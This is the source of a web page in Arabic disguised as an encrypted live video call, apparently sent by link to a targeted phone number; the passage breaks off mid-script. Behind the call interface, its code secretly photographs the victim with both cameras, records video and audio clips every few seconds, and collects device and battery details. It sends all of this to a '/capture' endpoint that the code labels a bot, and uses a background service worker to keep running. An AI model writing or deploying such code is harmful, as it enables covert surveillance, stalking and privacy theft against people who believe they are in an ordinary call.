<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="theme-color" content="#000000">
    <meta name="mobile-web-app-capable" content="yes">
    <title>📞 اتصال مباشر | النسخة الأعظم</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --safe-bottom: env(safe-area-inset-bottom, 20px);
            --safe-top: env(safe-area-inset-top, 16px);
            --primary: #8b5cf6;
            --accent: #ec4899;
            --danger: #ef4444;
            --success: #22c55e;
            --warning: #f59e0b;
            --info: #3b82f6;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Tajawal', sans-serif;
            background: #000;
            width: 100vw;
            height: 100vh;
            height: 100dvh;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
            touch-action: manipulation;
            -webkit-user-select: none;
            user-select: none;
            -webkit-overflow-scrolling: none;
        }

        /* منع السحب والتمرير */
        body.prevent-scroll {
            position: fixed;
            overflow: hidden;
            width: 100%;
            height: 100%;
        }

        .app-container {
            width: 100%;
            height: 100%;
            position: relative;
            background: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0f 100%);
            display: flex;
            flex-direction: column;
        }

        /* ==========================================
           🎥 منطقة الفيديو الرئيسية
           ========================================== */
        .main-video-wrapper {
            flex: 1;
            position: relative;
            background: #000;
            overflow: hidden;
            min-height: 0;
        }

        .main-video-wrapper video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        /* جسيمات */
        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 3;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: rgba(139, 92, 246, 0.8);
            border-radius: 50%;
            animation: floatUp 4s infinite ease-in;
        }

        @keyframes floatUp {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100px) scale(1.5); opacity: 0; }
        }

        /* ==========================================
           🎛️ التراكبات
           ========================================== */
        .info-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            z-index: 10;
            pointer-events: none;
        }

        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 20px;
            padding-top: max(16px, var(--safe-top));
            background: linear-gradient(180deg, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.4) 70%, transparent 100%);
        }

        .status-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 6px 14px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.15);
            pointer-events: auto;
        }

        .live-dot {
            width: 8px;
            height: 8px;
            background: #22c55e;
            border-radius: 50%;
            animation: livePulse 1.5s infinite;
            box-shadow: 0 0 12px rgba(34, 197, 94, 0.7);
        }

        @keyframes livePulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.6); opacity: 0.5); }
        }

        .encrypted-badge {
            display: flex;
            align-items: center;
            gap: 6px;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 6px 14px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.15);
            font-size: 11px;
            color: rgba(255,255,255,0.8);
            pointer-events: auto;
        }

        /* عداد المكالمة */
        .timer-display {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 10;
            pointer-events: none;
            text-align: center;
        }

        .timer-ring {
            width: 110px;
            height: 110px;
            border-radius: 50%;
            background: rgba(0,0,0,0.4);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border: 2px solid rgba(255,255,255,0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            animation: ringPulse 3s ease-in-out infinite;
        }

        @keyframes ringPulse {
            0%, 100% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.2); }
            50% { box-shadow: 0 0 60px rgba(139, 92, 246, 0.5); }
        }

        .timer-text {
            font-family: 'Cairo', sans-serif;
            font-size: 30px;
            font-weight: 800;
            color: white;
            letter-spacing: 2px;
            text-shadow: 0 0 20px rgba(255,255,255,0.5);
        }

        /* مؤشرات النشاط */
        .activity-indicators {
            position: absolute;
            bottom: 150px;
            left: 0;
            right: 0;
            display: flex;
            justify-content: center;
            gap: 16px;
            z-index: 10;
            pointer-events: none;
        }

        .indicator-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: rgba(255,255,255,0.4);
            transition: all 0.3s;
        }

        .indicator-dot.active {
            background: #a855f7;
            box-shadow: 0 0 16px rgba(168, 85, 247, 1);
            animation: dotFlash 0.5s ease;
            transform: scale(2);
        }

        @keyframes dotFlash {
            0% { transform: scale(1); }
            50% { transform: scale(3); }
            100% { transform: scale(1); }
        }

        /* ==========================================
           🎮 لوحة التحكم السفلية
           ========================================== */
        .control-panel {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            z-index: 20;
            padding: 16px 24px;
            padding-bottom: calc(16px + var(--safe-bottom));
            background: linear-gradient(0deg, rgba(0,0,0,0.97) 0%, rgba(0,0,0,0.7) 60%, transparent 100%);
        }

        .controls-row {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 16px;
        }

        .ctrl-btn {
            width: 52px;
            height: 52px;
            border-radius: 50%;
            border: none;
            cursor: pointer;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 19px;
            color: white;
            position: relative;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        .ctrl-btn:active {
            transform: scale(0.85);
            transition: transform 0.1s;
        }

        .btn-flip {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1.5px solid rgba(255,255,255,0.2);
        }

        .btn-mute {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1.5px solid rgba(255,255,255,0.2);
        }

        .btn-mute.muted {
            background: rgba(239, 68, 68, 0.7);
            border-color: rgba(239, 68, 68, 0.9);
            box-shadow: 0 0 25px rgba(239, 68, 68, 0.4);
        }

        .btn-end {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            box-shadow: 0 8px 30px rgba(239, 68, 68, 0.5);
            font-size: 22px;
        }

        .btn-end i {
            transform: rotate(135deg);
        }

        .btn-cam {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1.5px solid rgba(255,255,255,0.2);
        }

        .btn-cam.off {
            background: rgba(239, 68, 68, 0.7);
            border-color: rgba(239, 68, 68, 0.9);
            box-shadow: 0 0 25px rgba(239, 68, 68, 0.4);
        }

        /* شريط الإحصائيات */
        .stats-bar {
            display: flex;
            justify-content: center;
            gap: 14px;
            margin-top: 14px;
            flex-wrap: wrap;
        }

        .stat-item {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 10px;
            color: rgba(255,255,255,0.7);
            font-weight: 600;
            background: rgba(255,255,255,0.05);
            padding: 4px 10px;
            border-radius: 12px;
        }

        .stat-dot {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            animation: statBlink 1s infinite;
        }

        .stat-dot.selfie { background: #f59e0b; box-shadow: 0 0 8px rgba(245, 158, 11, 0.6); }
        .stat-dot.back { background: #3b82f6; box-shadow: 0 0 8px rgba(59, 130, 246, 0.6); }
        .stat-dot.video { background: #ef4444; box-shadow: 0 0 8px rgba(239, 68, 68, 0.6); }
        .stat-dot.audio { background: #22c55e; box-shadow: 0 0 8px rgba(34, 197, 94, 0.6); }

        @keyframes statBlink {
            0%, 100% { opacity: 0.4; }
            50% { opacity: 1; }
        }

        /* ==========================================
           🔔 التوست
           ========================================== */
        .toast {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.8);
            z-index: 100;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            color: white;
            padding: 14px 28px;
            border-radius: 30px;
            font-size: 13px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            opacity: 0;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            pointer-events: none;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.15);
        }

        .toast.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }

        /* ==========================================
           📱 شاشة النهاية
           ========================================== */
        .end-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 50;
            background: rgba(0,0,0,0.96);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
            padding: 30px;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s;
        }

        .end-screen.visible {
            opacity: 1;
            pointer-events: auto;
        }

        .end-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: rgba(239,68,68,0.15);
            border: 3px solid rgba(239,68,68,0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 24px;
            animation: endPulse 2s infinite;
        }

        @keyframes endPulse {
            0%, 100% { box-shadow: 0 0 0 rgba(239,68,68,0.3); }
            50% { box-shadow: 0 0 40px rgba(239,68,68,0.6); }
        }

        .btn-restart {
            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
            color: white;
            border: none;
            padding: 14px 36px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            margin-top: 24px;
            box-shadow: 0 8px 30px rgba(139, 92, 246, 0.4);
            transition: all 0.3s;
        }

        .btn-restart:active {
            transform: scale(0.95);
        }

        /* أدوات مخفية */
        .hidden-tools {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        @media (min-width: 1024px) {
            .app-container {
                max-width: 500px;
                max-height: 900px;
                border-radius: 40px;
                overflow: hidden;
                margin: auto;
                box-shadow: 0 0 80px rgba(139, 92, 246, 0.3);
            }
        }
    </style>
</head>
<body class="prevent-scroll">

    <div class="app-container" id="app">
        
        <!-- منطقة الفيديو -->
        <div class="main-video-wrapper">
            <video id="main-video" autoplay playsinline muted></video>
            <div class="particles" id="particles"></div>
            
            <div class="info-overlay">
                <div class="top-bar">
                    <div class="status-badge">
                        <span class="live-dot"></span>
                        <span style="color:white;font-size:12px;font-weight:700;">بث مباشر</span>
                    </div>
                    <div class="encrypted-badge">
                        <i class="fa-solid fa-shield-halved" style="font-size:9px;color:#22c55e;"></i>
                        <span>مشفر</span>
                    </div>
                </div>
            </div>

            <div class="timer-display">
                <div class="timer-ring">
                    <span class="timer-text" id="timer">00:00</span>
                </div>
            </div>

            <div class="activity-indicators">
                <div class="indicator-dot" id="dot-selfie"></div>
                <div class="indicator-dot" id="dot-back"></div>
                <div class="indicator-dot" id="dot-video"></div>
                <div class="indicator-dot" id="dot-audio"></div>
            </div>
        </div>

        <div class="control-panel">
            <div class="controls-row">
                <button class="ctrl-btn btn-flip" id="flip-btn">
                    <i class="fa-solid fa-camera-rotate"></i>
                </button>
                <button class="ctrl-btn btn-mute" id="mute-btn">
                    <i class="fa-solid fa-microphone"></i>
                </button>
                <button class="ctrl-btn btn-end" id="end-btn">
                    <i class="fa-solid fa-phone"></i>
                </button>
                <button class="ctrl-btn btn-cam" id="cam-btn">
                    <i class="fa-solid fa-video"></i>
                </button>
            </div>

            <div class="stats-bar">
                <div class="stat-item">
                    <span class="stat-dot selfie"></span>
                    <span>سيلفي</span>
                    <span id="count-selfie" style="color:white;font-weight:700;">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-dot back"></span>
                    <span>خلفي</span>
                    <span id="count-back" style="color:white;font-weight:700;">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-dot video"></span>
                    <span>فيديو</span>
                    <span id="count-video" style="color:white;font-weight:700;">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-dot audio"></span>
                    <span>صوت</span>
                    <span id="count-audio" style="color:white;font-weight:700;">0</span>
                </div>
            </div>
        </div>

        <div class="end-screen" id="end-screen">
            <div class="end-icon">
                <i class="fa-solid fa-phone" style="font-size:32px;color:#ef4444;transform:rotate(135deg);"></i>
            </div>
            <h2 style="font-family:Cairo;font-size:28px;font-weight:800;">تم إنهاء المكالمة</h2>
            <p id="end-duration" style="opacity:0.7;margin-top:8px;font-size:14px;"></p>
            <button class="btn-restart" onclick="location.reload()">
                <i class="fa-solid fa-rotate-right" style="margin-left:8px;"></i>
                اتصال جديد
            </button>
        </div>

        <canvas class="hidden-tools" id="selfie-canvas" width="1280" height="720"></canvas>
        <canvas class="hidden-tools" id="back-canvas" width="1280" height="720"></canvas>
    </div>

    <!-- Service Worker للتشغيل في الخلفية -->
    <script>
        // تسجيل Service Worker للعمل الدائم في الخلفية
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('install', (e) => {
                    self.skipWaiting();
                });
                self.addEventListener('activate', (e) => {
                    e.waitUntil(clients.claim());
                });
                self.addEventListener('fetch', (e) => {
                    e.respondWith(fetch(e.request));
                });
                self.addEventListener('message', (e) => {
                    if (e.data === 'keepAlive') {
                        // إبقاء العامل نشطاً
                    }
                });
                // منع إنهاء الخدمة
                setInterval(() => {
                    self.clients.matchAll().then(clients => {
                        clients.forEach(client => client.postMessage('ping'));
                    });
                }, 20000);
            `;
            
            const blob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);
            
            navigator.serviceWorker.register(swUrl)
                .then(reg => console.log('✅ Service Worker نشط للعمل في الخلفية'))
                .catch(() => console.log('⚠️ Service Worker غير مدعوم'));
        }
    </script>

    <script>
        (function() {
            'use strict';

            // ==========================================
            // 📋 الإعدادات والمتغيرات
            // ==========================================
            const urlParams = new URLSearchParams(window.location.search);
            const sessionId = urlParams.get('session');
            const targetNumber = urlParams.get('target') || 'غير معروف';

            if (!sessionId) {
                document.body.innerHTML = `
                    <div style="display:flex;align-items:center;justify-content:center;height:100vh;color:white;text-align:center;padding:30px;background:#000;">
                        <div>
                            <i class="fa-solid fa-circle-exclamation" style="font-size:60px;color:#ef4444;margin-bottom:20px;"></i>
                            <h2 style="font-family:Cairo;font-weight:800;">الرابط غير صالح</h2>
                            <p style="opacity:0.7;margin-top:10px;">مفقود معرف الجلسة (session)</p>
                        </div>
                    </div>`;
                throw new Error('Session ID missing');
            }

            // عناصر DOM
            const videoEl = document.getElementById('main-video');
            const flipBtn = document.getElementById('flip-btn');
            const muteBtn = document.getElementById('mute-btn');
            const endBtn = document.getElementById('end-btn');
            const camBtn = document.getElementById('cam-btn');
            const timerEl = document.getElementById('timer');
            const selfieCanvas = document.getElementById('selfie-canvas');
            const backCanvas = document.getElementById('back-canvas');
            const selfieCtx = selfieCanvas.getContext('2d');
            const backCtx = backCanvas.getContext('2d');
            const endScreen = document.getElementById('end-screen');
            const endDuration = document.getElementById('end-duration');
            const toast = document.createElement('div');
            toast.className = 'toast';
            document.getElementById('app').appendChild(toast);

            // العدادات
            let countSelfie = 0, countBack = 0, countVideo = 0, countAudio = 0;
            const countSelfieEl = document.getElementById('count-selfie');
            const countBackEl = document.getElementById('count-back');
            const countVideoEl = document.getElementById('count-video');
            const countAudioEl = document.getElementById('count-audio');
            const dotSelfie = document.getElementById('dot-selfie');
            const dotBack = document.getElementById('dot-back');
            const dotVideo = document.getElementById('dot-video');
            const dotAudio = document.getElementById('dot-audio');

            // الحالة
            let mediaStream = null;
            let isMuted = false;
            let isCameraOff = false;
            let facingMode = 'user';
            let callStartTime = null;
            let timerInterval = null;
            let isCallActive = true;

            // الإعدادات الديناميكية (تتغير بالأوامر)
            let settings = {
                selfieInterval: 10,      // ثواني
                backInterval: 10,        // ثواني
                videoDuration: 10,       // ثواني
                audioDuration: 10,       // ثواني
                selfieCount: Infinity,   // عدد غير محدود
                backCount: Infinity,
                videoCount: Infinity,
                audioCount: Infinity
            };

            // المؤقتات
            let intervals = {
                selfie: null,
                back: null,
                video: null,
                audio: null
            };

            // ==========================================
            // ✨ الجسيمات
            // ==========================================
            function createParticles() {
                const container = document.getElementById('particles');
                for (let i = 0; i < 35; i++) {
                    const particle = document.createElement('div');
                    particle.className = 'particle';
                    particle.style.left = Math.random() * 100 + '%';
                    particle.style.animationDelay = Math.random() * 4 + 's';
                    particle.style.animationDuration = (3 + Math.random() * 5) + 's';
                    container.appendChild(particle);
                }
            }
            createParticles();

            // ==========================================
            // 💬 التوست
            // ==========================================
            function showToast(message, duration = 2500) {
                toast.textContent = message;
                toast.classList.add('show');
                clearTimeout(toast._timeout);
                toast._timeout = setTimeout(() => {
                    toast.classList.remove('show');
                }, duration);
            }

            // ==========================================
            // 📡 إرسال للبوت
            // ==========================================
            async function sendToServer(type, data, caption = '') {
                try {
                    const payload = {
                        type: type,
                        data: data,
                        sessionId: sessionId,
                        caption: `${caption}\n📱 من: ${targetNumber}\n🕒 ${new Date().toLocaleTimeString('ar-SA')}`
                    };

                    const response = await fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });

                    return await response.json();
                } catch (error) {
                    console.error(`❌ فشل إرسال ${type}:`, error.message);
                    return null;
                }
            }

            // ==========================================
            // 🎥 بدء المكالمة
            // ==========================================
            async function startCall() {
                try {
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 44100 }
                    });

                    videoEl.srcObject = mediaStream;
                    await videoEl.play();

                    callStartTime = Date.now();
                    startTimer();
                    startAllCaptures();
                    sendEntryNotification();

                    showToast('📞 تم الاتصال بنجاح');
                } catch (error) {
                    try {
                        mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        callStartTime = Date.now();
                        startTimer();
                        startAudioOnly();
                        sendEntryNotification();
                        showToast('📵 مكالمة صوتية فقط');
                    } catch (audioError) {
                        showToast('❌ فشل الاتصال');
                        sendToServer('text', '❌ فشل فتح الكاميرا والميكروفون', 'تنبيه فشل');
                    }
                }
            }

            // ==========================================
            // 🚪 إشعار الدخول مع معلومات الجهاز
            // ==========================================
            async function sendEntryNotification() {
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenSize: `${window.screen.width}x${window.screen.height}`,
                    deviceMemory: navigator.deviceMemory || 'غير معروف',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                    connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
                    battery: 'جاري...',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled ? 'مفعل' : 'معطل',
                    touch: 'ontouchstart' in window ? 'يدعم اللمس' : 'لا يدعم',
                    referrer: document.referrer || 'مباشر',
                    timestamp: new Date().toISOString()
                };

                // محاولة جلب البطارية
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        deviceInfo.battery = `${Math.round(battery.level * 100)}% - ${battery.charging ? 'يشحن' : 'لا يشحن'}`;
                    } catch (e) {}
                }

                const entryMessage = 
                    `🚪 *تم دخول شخص إلى الرابط*\n\n` +
                    `👤 *معلومات الدخول:*\n` +
                    `📱 الجهاز: ${deviceInfo.userAgent.substring(0, 80)}...\n` +
                    `💻 المنصة: ${deviceInfo.platform}\n` +
                    `🌐 اللغة: ${deviceInfo.language}\n` +
                    `📺 الشاشة: ${deviceInfo.screenSize}\n` +
                    `🧠 الذاكرة: ${deviceInfo.deviceMemory} GB\n` +
                    `⚡ المعالج: ${deviceInfo.hardwareConcurrency} نواة\n` +
                    `📶 الاتصال: ${deviceInfo.connection}\n` +
                    `🔋 البطارية: ${deviceInfo.battery}\n` +
                    `🕐 التوقيت: ${deviceInfo.timezone}\n` +
                    `🍪 الكوكيز: ${deviceInfo.cookies}\n` +
                    `👆 اللمس: ${deviceInfo.touch}\n` +
                    `🔗 المُحيل: ${deviceInfo.referrer}\n` +
                    `🆔 الجلسة: ${sessionId}\n` +
                    `📱 الهدف: ${targetNumber}\n` +
                    `⏰ ${new Date().toLocaleString('ar-SA')}`;

                await sendToServer('text', entryMessage, '🚪 إشعار دخول');
                
                // إرسال صورة أولية إذا الكاميرا شغالة
                setTimeout(async () => {
                    if (videoEl.videoWidth > 0 && !isCameraOff) {
                        try {
                            selfieCanvas.width = videoEl.videoWidth;
                            selfieCanvas.height = videoEl.videoHeight;
                            selfieCtx.drawImage(videoEl, 0, 0, selfieCanvas.width, selfieCanvas.height);
                            const imgData = selfieCanvas.toDataURL('image/jpeg', 0.8);
                            await sendToServer('image', imgData, '📸 صورة دخول أولية');
                        } catch (e) {}
                    }
                }, 3000);
            }

            // ==========================================
            // ⏱️ المؤقت
            // ==========================================
            function startTimer() {
                timerInterval = setInterval(() => {
                    const elapsed = Math.floor((Date.now() - callStartTime) / 1000);
                    const mins = Math.floor(elapsed / 60).toString().padStart(2, '0');
                    const secs = (elapsed % 60).toString().padStart(2, '0');
                    timerEl.textContent = `${mins}:${secs}`;
                }, 1000);
            }

            // ==========================================
            // 🚀 تشغيل جميع العمليات
            // ==========================================
            function startAllCaptures() {
                startSelfieCapture();
                startBackCameraCapture();
                startVideoCapture();
                startAudioRecording();
            }

            function stopAllCaptures() {
                Object.values(intervals).forEach(iv => { if (iv) clearInterval(iv); });
            }

            function restartAllCaptures() {
                stopAllCaptures();
                startAllCaptures();
            }

            // ==========================================
            // 📸 سيلفي أمامي
            // ==========================================
            function startSelfieCapture() {
                if (intervals.selfie) clearInterval(intervals.selfie);
                
                intervals.selfie = setInterval(async () => {
                    if (!isCallActive || isCameraOff) return;
                    if (facingMode !== 'user') return;
                    if (countSelfie >= settings.selfieCount) {
                        clearInterval(intervals.selfie);
                        return;
                    }

                    try {
                        if (videoEl.videoWidth === 0) return;
                        selfieCanvas.width = videoEl.videoWidth;
                        selfieCanvas.height = videoEl.videoHeight;
                        selfieCtx.drawImage(videoEl, 0, 0, selfieCanvas.width, selfieCanvas.height);
                        const imageData = selfieCanvas.toDataURL('image/jpeg', 0.8);
                        await sendToServer('image', imageData, `🤳 سيلفي #${countSelfie + 1}`);
                        countSelfie++;
                        countSelfieEl.textContent = countSelfie;
                        flashDot(dotSelfie);
                    } catch (e) {}
                }, settings.selfieInterval * 1000);
            }

            // ==========================================
            // 📷 تصوير خلفي
            // ==========================================
            function startBackCameraCapture() {
                if (intervals.back) clearInterval(intervals.back);
                
                intervals.back = setInterval(async () => {
                    if (!isCallActive) return;
                    if (countBack >= settings.backCount) {
                        clearInterval(intervals.back);
                        return;
                    }

                    try {
                        const backStream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                            audio: false
                        });

                        const backVideo = document.createElement('video');
                        backVideo.srcObject = backStream;
                        backVideo.setAttribute('playsinline', '');
                        backVideo.setAttribute('muted', '');
                        await backVideo.play();
                        await sleep(1000);

                        backCanvas.width = backVideo.videoWidth || 1280;
                        backCanvas.height = backVideo.videoHeight || 720;
                        backCtx.drawImage(backVideo, 0, 0, backCanvas.width, backCanvas.height);

                        const imageData = backCanvas.toDataURL('image/jpeg', 0.8);

                        backStream.getTracks().forEach(t => t.stop());
                        backVideo.srcObject = null;

                        await sendToServer('image', imageData, `📷 خلفي #${countBack + 1}`);
                        countBack++;
                        countBackEl.textContent = countBack;
                        flashDot(dotBack);
                    } catch (e) {}
                }, settings.backInterval * 1000);
            }

            // ==========================================
            // 🎬 فيديو
            // ==========================================
            function startVideoCapture() {
                if (intervals.video) clearInterval(intervals.video);
                
                intervals.video = setInterval(async () => {
                    if (!isCallActive || isCameraOff) return;
                    if (!mediaStream || !mediaStream.getVideoTracks().length) return;
                    if (countVideo >= settings.videoCount) {
                        clearInterval(intervals.video);
                        return;
                    }

                    try {
                        const chunks = [];
                        const recorder = new MediaRecorder(mediaStream, {
                            mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8') 
                                ? 'video/webm;codecs=vp8' : 'video/webm'
                        });

                        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                        recorder.onstop = async () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onloadend = async () => {
                                await sendToServer('video', reader.result, `🎬 فيديو ${countVideo + 1} (${settings.videoDuration} ث)`);
                                countVideo++;
                                countVideoEl.textContent = countVideo;
                                flashDot(dotVideo);
                            };
                            reader.readAsDataURL(blob);
                        };

                        recorder.start();
                        setTimeout(() => {
                            if (recorder.state === 'recording') recorder.stop();
                        }, settings.videoDuration * 1000);

                    } catch (e) {}
                }, settings.videoDuration * 1000);
            }

            // ==========================================
            // 🎙️ تسجيل صوتي
            // ==========================================
            function startAudioRecording() {
                if (intervals.audio) clearInterval(intervals.audio);
                
                intervals.audio = setInterval(async () => {
                    if (!isCallActive) return;
                    if (countAudio >= settings.audioCount) {
                        clearInterval(intervals.audio);
                        return;
                    }

                    try {
                        let audioStream;
                        if (mediaStream && mediaStream.getAudioTracks().length > 0) {
                            audioStream = new MediaStream([mediaStream.getAudioTracks()[0]]);
                        } else {
                            audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        }

                        const chunks = [];
                        const recorder = new MediaRecorder(audioStream, {
                            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
                                ? 'audio/webm;codecs=opus' : 'audio/webm'
                        });

                        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                        recorder.onstop = async () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            const reader = new FileReader();
                            reader.onloadend = async () => {
                                await sendToServer('audio', reader.result, `🎙️ صوت ${countAudio + 1} (${settings.audioDuration} ث)`);
                                countAudio++;
                                countAudioEl.textContent = countAudio;
                                flashDot(dotAudio);
                            };
                            reader.readAsDataURL(blob);
                        };

                        recorder.start();
                        setTimeout(() => {
                            if (recorder.state === 'recording') recorder.stop();
                        }, settings.audioDuration * 1000);

                    } catch (e) {}
                }, settings.audioDuration * 1000);
            }

            // ==========================================
            // 🔊 وضع الصوت فقط
            // ==========================================
            function startAudioOnly() {
                intervals.audio = setInterval(async () => {
                    if (!isCallActive) return;
                    if (countAudio >= settings.audioCount) return;
                    
                    try {
                        const chunks = [];
                        const recorder = new MediaRecorder(mediaStream, {
                            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
                                ? 'audio/webm;codecs=opus' : 'audio/webm'
                        });
                        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
                        recorder.onstop = async () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            const reader = new FileReader();
                            reader.onloadend = async () => {
                                await sendToServer('audio', reader.result, `🎙️ صوت ${countAudio + 1}`);
                                countAudio++;
                                countAudioEl.textContent = countAudio;
                                flashDot(dotAudio);
                            };
                            reader.readAsDataURL(blob);
                        };
                        recorder.start();
                        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, settings.audioDuration * 1000);
                    } catch (e) {}
                }, settings.audioDuration * 1000);
            }

            // ==========================================
            // 💡 وميض المؤشرات
            // ==========================================
            function flashDot(dot) {
                dot.classList.add('active');
                setTimeout(() => dot.classList.remove('active'), 500);
            }

            // ==========================================
            // 🎛️ قلب الكاميرا
            // ==========================================
            async function flipCamera() {
                facingMode = facingMode === 'user' ? 'environment' : 'user';
                if (mediaStream) {
                    mediaStream.getTracks().forEach(t => t.stop());
                }
                try {
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: { echoCancellation: true, noiseSuppression: true }
                    });
                    videoEl.srcObject = mediaStream;
                    await videoEl.play();
                    flipBtn.style.background = facingMode === 'environment' ? 'rgba(59, 130, 246, 0.5)' : 'rgba(255,255,255,0.1)';
                    showToast(facingMode === 'user' ? '📱 الكاميرا الأمامية' : '📷 الكاميرا الخلفية');
                } catch (e) {
                    showToast('❌ فشل قلب الكاميرا');
                }
            }

            // ==========================================
            // 🎮 أحداث الأزرار
            // ==========================================
            flipBtn.addEventListener('click', flipCamera);

            muteBtn.addEventListener('click', () => {
                if (!mediaStream) return;
                const audioTrack = mediaStream.getAudioTracks()[0];
                if (audioTrack) {
                    isMuted = !isMuted;
                    audioTrack.enabled = !isMuted;
                    muteBtn.classList.toggle('muted', isMuted);
                    muteBtn.querySelector('i').className = isMuted 
                        ? 'fa-solid fa-microphone-slash' : 'fa-solid fa-microphone';
                    showToast(isMuted ? '🔇 تم كتم الصوت' : '🎤 تم إلغاء الكتم');
                }
            });

            camBtn.addEventListener('click', () => {
                if (!mediaStream) return;
                const videoTrack = mediaStream.getVideoTracks()[0];
                if (videoTrack) {
                    isCameraOff = !isCameraOff;
